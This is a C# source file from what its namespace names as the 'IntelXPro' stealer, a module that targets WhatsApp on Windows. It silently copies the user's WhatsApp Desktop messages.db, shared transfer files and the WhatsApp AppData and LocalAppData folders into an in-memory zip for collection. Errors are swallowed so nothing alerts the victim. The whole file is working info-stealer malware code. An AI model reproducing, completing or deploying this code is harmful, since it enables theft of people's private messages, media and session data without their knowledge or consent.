using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications.Messengers
{
    internal class WhatsApp : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "WhatsApp";
            int fileCount = 0;

            string whatsAppDesktopPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Packages", "5319275A.WhatsAppDesktop_cv1g1gvanyjgm", "LocalState");
            if (Directory.Exists(whatsAppDesktopPath))
            {
                try
                {
                    string messagesDb = Path.Combine(whatsAppDesktopPath, "messages.db");
                    if (File.Exists(messagesDb))
                    {
                        string targetPath = "WhatsApp\\Desktop\\messages.db";
                        zip.AddFile(targetPath, File.ReadAllBytes(messagesDb));
                        counterApplications.Files.Add(messagesDb + " => " + targetPath);
                        fileCount++;
                    }

                    string transfersPath = Path.Combine(whatsAppDesktopPath, "shared", "transfers");
                    if (Directory.Exists(transfersPath))
                    {
                        string targetPath = "WhatsApp\\Desktop\\transfers";
                        zip.AddDirectoryFiles(transfersPath, targetPath);
                        counterApplications.Files.Add(transfersPath + " => " + targetPath);
                        fileCount++;
                    }
                }
                catch
                {
                }
            }

            string whatsAppAppData = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "WhatsApp");
            if (Directory.Exists(whatsAppAppData))
            {
                try
                {
                    string targetPath = "WhatsApp\\AppData";
                    zip.AddDirectoryFiles(whatsAppAppData, targetPath);
                    counterApplications.Files.Add(whatsAppAppData + " => " + targetPath);
                    fileCount++;
                }
                catch
                {
                }
            }

            string whatsAppLocal = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "WhatsApp");
            if (Directory.Exists(whatsAppLocal))
            {
                try
                {
                    string targetPath = "WhatsApp\\LocalAppData";
                    zip.AddDirectoryFiles(whatsAppLocal, targetPath);
                    counterApplications.Files.Add(whatsAppLocal + " => " + targetPath);
                    fileCount++;
                }
                catch
                {
                }
            }

            if (fileCount > 0)
            {
                counterApplications.Files.Add("WhatsApp\\");
                counter.Messangers.Add(counterApplications);
            }
        }
    }
}
